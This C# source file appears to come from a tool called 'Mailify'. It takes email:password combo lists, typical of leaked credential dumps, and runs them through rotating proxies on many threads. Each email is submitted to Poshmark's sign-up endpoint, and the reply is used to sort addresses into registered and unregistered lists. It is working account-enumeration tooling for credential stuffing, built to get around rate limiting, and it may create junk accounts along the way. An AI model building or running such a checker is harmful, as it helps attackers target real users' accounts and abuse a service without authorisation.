using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Poshmark_VM
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;


            new Thread(() => Variables.VM_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var request = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    request.Proxy.ConnectTimeout = proxyTimeout;
                    request.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                    var POSHMARK = Functions.RandomString("?l?l?u?l?d?d?d?l");
                    string check = request.Post("https://poshmark.com/vm-rest/auth/users?pm_version=137.1.0", "{\"email\":\"" + credentials[0] + "\",\"username\":\"" + POSHMARK + "\",\"home_domain\":\"us\",\"referral_code\":\"\",\"iobb\":\"0400JmLnt5pkv7EXk1Rjuv1iJnsDZowe6/tVcqcioOOyVsAHRcVlqPPsNjBjMAnDdX5Lo68d+XcjA3Rsx0n8T9ETH5sZhQDshHSvbqjr0m72nwXn+sXp6atjcdFz6al2swBmqLIkirXoLv7Xnfra5uHnDxyNWym308lBMIqy2Zw6i85J27cNnYPSQUyAZ5slTMaJY+aw0wsKl9tiCIZRJQvjJd0or96Ahdk2Yb9x2QgwVubph/T+lMlRTPW82nRfZnDxDJ0qCc4gMpergecSo06izVzqeMmBCH/i9cmKrLQxcxA5OE2KkOZe/0jXzk77ILZ/eUsQ7RNrLro1kTKIs1496YkpIh3A707lm2e25SQbo1OuF8qR6VxrbLm5yIh+F5dju6828R9GQm6kHLdnyFIQwfgqhnKLkKSn5dzgojLfFGtYcNrVTqmlpFbR7cl4S1b4HGoQSB4awnkydiNh4qAiMsPhNaG/vxUQid7nrHt/JVGW/+e5dBdAa9fSAoM4U/Vr8+g/mDVDCxGOd9AmjPBIJxitFcChQCCeqwAxaRLgkCNhO1Q2jmVgfDoPcOyOxFI2PMF6RbbQMS9rqhCzKJ9oOCaUGABVKw5X0ikb/3h1d0Im6Fy7sPS5usl67lxZGIxLGgW/RvVDlF1qDaXjTzpVnjhDYGOJFVPcAfOPjzqyODJKA+IhyeWtUEuHuH9BhO0tceSZkN6ipsurgecSo06izVzqeMmBCH/i9cmKrLQxcxA5OE2KkOZe/0jXzk77ILZ/eUsQ7RNrLro1kTKIs1496YkpIh3A707lm2e25SQbo1OuF8qR6VxrbLm5yIh+F5dju6828R9GQm6kHLdnyFIQwcv2RovzmXNT1g9RJPeBNicb7yAKVlYU34/VcdsVtZ270iAXyzfkdDO/TDp0UzLYS+KjA5OTNopRQtncHmePC+1SwejOX5dhKGYrsu13rc4RCbryu9G8AaRxi/UgQBHzxwUkaRoD62ZV2b7dgC2t18ZUbJxc190qDrCy7oj6iXjqCHXZwvUpQ5aTMOfXbB/O5h0mrbMSlEGI/eL+hd6MoUcPx4lfyeuSr5YDrO00R2GCddD62VmO/ZTctHUFIWKNLa77BjzJd5YDfqYAndlMe7bdZoUxykO48vWDDY6js4EVSiLPAgLTR9UUUA3pDXHzRR0J0Z3KrDBt6QO53m5a4VI05lyt1veYpHNuv7sghWOEeioIZRnmC0W+ochQziz7ftZJCaKwymxS1wfmZzpno81pjMGt2Ji4mZGkKIFXCOd6BeiOThsX3U8DonbrtbBLM1X69+PjMzmoH99H+38ixUw=\",\"first_name\":\"wadaw\",\"last_name\":\"awdaw\",\"password\":\"yourgay1234\",\"gender\":\"unspecified\"}", "application/json").ToString();

                    if (check.Contains("EmailTakenError"))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (check.Contains("isUserLoggedIn\":true"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Not Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }
                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}